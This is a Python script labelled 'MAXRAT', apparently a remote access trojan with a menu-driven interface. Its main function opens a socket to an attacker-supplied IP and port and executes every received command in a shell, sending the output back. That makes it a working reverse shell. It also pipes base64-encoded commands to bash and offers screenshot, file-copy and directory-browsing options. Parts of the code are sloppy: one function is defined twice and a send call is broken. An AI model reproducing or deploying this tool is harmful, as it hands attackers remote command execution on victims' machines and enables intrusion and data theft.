import os
import subprocess
import threading
import socket
import base64
import time
import logging
import shutil

# Configure logging
logging.basicConfig(filename='script.log', level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# Function to execute system commands
def execute_system_command(command):
    return subprocess.check_output(command, shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)

# Function to connect to attacker machine
def connect_to_attacker(attacker_ip, attacker_port):
    try:
        logging.info("Connecting to attacker...")
        time.sleep(2)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((attacker_ip, attacker_port))
        
        logging.info("Connection established.")
        time.sleep(1)

        while True:
            command = s.recv(1024).decode("utf-8")
            if command == "exit":
                s.close()
                break
            elif command[:2] == "cd":
                os.chdir(command[3:])
                s.send("Directory changed to " + os.getcwd())
            else:
                command_result = execute_system_command(command)
                s.send(command_result)
    except Exception as e:
        logging.error("Error occurred while connecting to attacker: %s", e)
        pass

# Function to start reverse shell
def start_reverse_shell():
    try:
        attacker_ip = input("Enter attacker's IP: ")
        attacker_port = int(input("Enter attacker's port: "))
        logging.info("Starting reverse shell...")
        time.sleep(2)
        connect_to_attacker(attacker_ip, attacker_port)
    except Exception as e:
        logging.error("Error occurred while starting reverse shell: %s", e)
        pass

# Function to encode script
def encode_script(script):
    encoded_script = base64.b64encode(script.encode("utf-8")).decode("utf-8")
    return f"echo '{encoded_script}' | base64 -d | bash"

# Function to take a screenshot of the target machine's desktop
def take_screenshot():
    try:
        logging.info("Taking screenshot...")
        os.system("gnome-screenshot -f /kali/Desktop/screenshot.png")  # Save the screenshot in the attacker's desktop
        logging.info("Screenshot saved as screenshot.png on your desktop.")
    except Exception as e:
        logging.error("Error occurred while taking screenshot: %s", e)

# Function to download a file from the target system
def download_file():
    try:
        filename = input("Enter the filename you want to download: ")
        if os.path.exists(filename):
            shutil.copyfile(filename, os.path.basename(filename))
            logging.info("File downloaded: %s", filename)
        else:
            logging.warning("File does not exist: %s", filename)
    except Exception as e:
        logging.error("Error occurred while downloading file: %s", e)

# Function to browse the file directory
def browse_file_directory():
    try:
        directory = input("Enter the directory path you want to browse: ")
        os.chdir(directory)
        files = os.listdir(directory)
        for file in files:
            print(file)
        logging.info("Browsing directory: %s", directory)
    except Exception as e:
        logging.error("Error occurred while browsing directory: %s", e)

# Function to execute system commands
def execute_system_command(command):
    return subprocess.check_output(command, shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)

# Function to display command history
def display_command_history():
    try:
        logging.info("Displaying command history...")
        with open("command_history.txt", "r") as file:
            history = file.read()
            print("Command History:")
            print(history)
    except Exception as e:
        logging.error("Error occurred while displaying command history: %s", e)

if __name__ == "__main__":
    try:
        logging.info("Script started.")

        print("""
.___  ___.      ___      ___   ___ .______          ___   .___________.
|   \/   |     /   \     \  \ /  / |   _  \        /   \  |           |
|  \  /  |    /  ^  \     \  V  /  |  |_)  |      /  ^  \ `---|  |----`
|  |\/|  |   /  /_\  \     >   <   |      /      /  /_\  \    |  |     
|  |  |  |  /  _____  \   /  .  \  |  |\  \----./  _____  \   |  |     
|__|  |__| /__/     \__\ /__/ \__\ | _| `._____/__/     \__\  |__|     
                                                                         
        """)

        while True:
            logging.info("Prompting user for action choice.")
            print("\nWhat would you like to do next?\n")
            print("1. Set target IP and port")
            print("2. Enter command")
            print("3. Take Screenshot")
            print("4. Download file")
            print("5. Browse file directory")
            print("6. Display Command History")
            print("7. Exit")
            choice = input("Enter your choice: ")

            if choice == "1":
                logging.info("User selected to set target IP and port.")
                start_reverse_shell()
            elif choice == "2":
                logging.info("User selected to enter command.")
                while True:
                    command = input("Enter command: ")
                    if command == "exit":
                        break
                    else:
                        encoded_command = encode_script(command)
                        os.system(encoded_command)
                        with open("command_history.txt", "a") as file:
                            file.write(command + "\n")
            elif choice == "3":
                logging.info("User selected to take a screenshot.")
                take_screenshot()
            elif choice == "4":
                logging.info("User selected to download a file.")
                download_file()
            elif choice == "5":
                logging.info("User selected to browse file directory.")
                browse_file_directory()
            elif choice == "6":
                logging.info("User selected to display command history.")
                display_command_history()
            elif choice == "7":
                logging.info("User selected to exit.")
                break
            else:
                logging.warning("Invalid choice entered by user: %s", choice)
                print("Invalid choice. Try again.")
    
    except Exception as e:
        logging.error("An exception occurred: %s", e)

    logging.info("Script finished.")
